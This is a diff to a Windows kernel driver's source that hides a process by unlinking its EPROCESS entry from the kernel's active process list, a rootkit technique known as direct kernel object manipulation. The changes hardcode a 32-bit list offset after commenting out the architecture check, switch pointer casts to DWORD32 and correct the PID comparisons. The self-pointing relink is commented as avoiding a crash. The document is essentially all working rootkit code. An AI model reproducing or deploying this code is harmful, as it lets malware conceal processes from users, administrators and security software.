@@ -1,8 +1,7 @@
 #include "driver.h"
-#include <wdf.h>
-#include <Wdfrequest.h>
 
-void modifyTaskList(PUINT32 pid) {
+
+void modifyTaskList(UINT32 pid) {
 
 
 	// Get PID offset nt!_EPROCESS.UniqueProcessId
@@ -12,51 +11,56 @@ void modifyTaskList(PUINT32 pid) {
 	ULONG LIST_OFFSET = PID_OFFSET;
 
 
-	// Check Architecture
-	if (WdfRequestIsFrom32BitProcess(NULL)) {
+	/* Check Architecture
+	if (IoIs32bitProcess(NULL)) {
 		LIST_OFFSET += 4;
 	}
 	else {
 		LIST_OFFSET += 8;
-	}
+	}*/
+	LIST_OFFSET += 4;
 
 	// Get current process
 	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();
 
 	// Initialize other variables
-	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((PDWORD64)CurrentEPROCESS + LIST_OFFSET);
-	PUINT32 CurrentPID = (PUINT32)((PDWORD64)CurrentEPROCESS + PID_OFFSET);
+	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((DWORD32)CurrentEPROCESS + LIST_OFFSET);
+	PUINT32 CurrentPID = (PUINT32)((DWORD32)CurrentEPROCESS + PID_OFFSET);
 
 
-	// Check self
-	if (CurrentPID == pid) {
+	// Check self 
+	if (*(UINT32 *)CurrentPID == pid) {
 		remove_links(CurrentList);
 		return;
 	}
 
 	// Record the starting position
-	PUINT32 StartPID = CurrentPID;
+	PEPROCESS StartProcess = CurrentEPROCESS;
 
 	// Move to next item
-	CurrentEPROCESS = (PEPROCESS)((PDWORD64)CurrentList->Flink - LIST_OFFSET);
-	CurrentPID = (PUINT32)((PDWORD64)CurrentEPROCESS + PID_OFFSET);
-	CurrentList = (PLIST_ENTRY)((PDWORD64)CurrentEPROCESS + LIST_OFFSET);
+	CurrentEPROCESS = (PEPROCESS)((DWORD32)CurrentList->Flink - LIST_OFFSET);
+	CurrentPID = (PUINT32)((DWORD32)CurrentEPROCESS + PID_OFFSET);
+	CurrentList = (PLIST_ENTRY)((DWORD32)CurrentEPROCESS + LIST_OFFSET);
+
 
 	// Loop until we find the right process to remove
 	// Or until we circle back
-	while (StartPID != CurrentPID) {
+	while ((DWORD32)StartProcess != (DWORD32)CurrentEPROCESS) {
 
 		// Check item
-		if (CurrentPID == pid) {
+		if (*(UINT32 *)CurrentPID == pid) {
 			remove_links(CurrentList);
 			return;
-		}
+		} 
+
 
 		// Move to next item
-		CurrentEPROCESS = (PEPROCESS)((PDWORD64)CurrentList->Flink - LIST_OFFSET);
-		CurrentPID = (PUINT32)((PDWORD64)CurrentEPROCESS + PID_OFFSET);
-		CurrentList = (PLIST_ENTRY)((PDWORD64)CurrentEPROCESS + LIST_OFFSET);
+		CurrentEPROCESS = (PEPROCESS)((DWORD32)CurrentList->Flink - LIST_OFFSET);
+		CurrentPID = (PUINT32)((DWORD32)CurrentEPROCESS + PID_OFFSET);
+		CurrentList = (PLIST_ENTRY)((DWORD32)CurrentEPROCESS + LIST_OFFSET);
 	}
+
+	return;
 }
 
 void remove_links(PLIST_ENTRY Current) {
@@ -66,6 +70,8 @@ void remove_links(PLIST_ENTRY Current) {
 	Previous = (Current->Blink);
 	Next = (Current->Flink);
 
+
+
 	// Loop over self (connect previous with next)
 	Previous->Flink = Next;
 	Next->Blink = Previous;
@@ -73,4 +79,7 @@ void remove_links(PLIST_ENTRY Current) {
 	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
 	Current->Blink = (PLIST_ENTRY)&Current->Flink;
 	Current->Flink = (PLIST_ENTRY)&Current->Flink;
+
+	return;
+	
 }
